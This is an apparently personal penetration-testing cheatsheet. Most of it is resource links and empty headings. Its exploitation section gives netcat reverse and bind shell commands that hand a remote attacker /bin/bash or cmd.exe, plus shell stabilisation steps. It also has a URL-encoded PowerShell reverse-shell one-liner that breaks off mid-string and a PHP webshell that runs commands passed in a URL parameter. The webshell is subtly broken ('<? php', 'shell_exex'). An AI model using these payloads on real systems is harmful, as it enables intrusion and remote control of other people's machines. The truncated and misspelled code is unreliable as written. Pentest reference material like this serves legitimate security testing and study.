# 2024 Penetration Testing Cheatsheet

## Other Cheatsheets/Libraries:
[Lolbas-Project](https://lolbas-project.github.io/)

[Ivan-Sincek Penetration testing cheat sheet (very detailed)](https://github.com/ivan-sincek/penetration-testing-cheat-sheet)

[GTFOBins](https://gtfobins.github.io/)

[MITRE ATT&CK](https://attack.mitre.org/)

## General Tools:

[CyberChef](https://gchq.github.io/CyberChef/)

## Information Gathering:

## Vulnerability Scanner:

[Nessus Essential Download](https://community.tenable.com/s/article/Nessus-Essentials?language=en_US)

### Databases:

[Nist](https://community.tenable.com/s/article/Nessus-Essentials?language=en_US)

[CVEdetails](https://www.cvedetails.com/)

[Exploit-DB](https://www.exploit-db.com/)

[Rapid7](https://www.rapid7.com/db/)

## Exploitation:

### Reverse Shells useful links:
https://github.com/martinsohn/PowerShell-reverse-shell

https://www.revshells.com/

https://github.com/samratashok/nishang/tree/master

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

### Netcat:
Reverse Shell:
```
    A: nc -lnvp <port_number>

    T: nc <local_ip> <port_number> -e /bin/bash
```
Bind Shell:
```
    T: nc -lnvp <port_number> -e "cmd.exe"

    A: nc <local_ip> <port_number>
```
Shell Stabilisation:

    1. Python (sometimes need to specify python version in first cmd)
        python -c 'import pty;pty.spawn("/bin/bash")'
        export TERM=xterm
        Ctrl + Z
        stty raw -echo; fg

    2. Rlwrap
        install rlwrap first on your kali:
        sudo apt install rlwrap

        invoke this listener:
            rlwrap nc -lnvp <port_number>
            CTRL + Z
            stty raw -echo; fg

    3. Socat

        TO-Do

### Socat:

Reverse Shell (normal):

Bind Shell (normal):

Reverse Shell (encrypted):

Bind Shell (encrypted):

### Msfvenom:

### Powershell one-liner:
``
    powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCI 
``

### PHP Webshell one-liner:
`<? php echo "<pre>" . shell_exex($_GET["cmd"]) . "</pre>"; ?>`

## Linux Privilege Escalation:

## Windows Privilege Escalation:

## Passwort Cracking:

### Hashcat:

### John the Ripper:

### Hydra:

## Exfiltration:

### Server:

### Upload:

### Download:

## Persistence:

## Cleanup: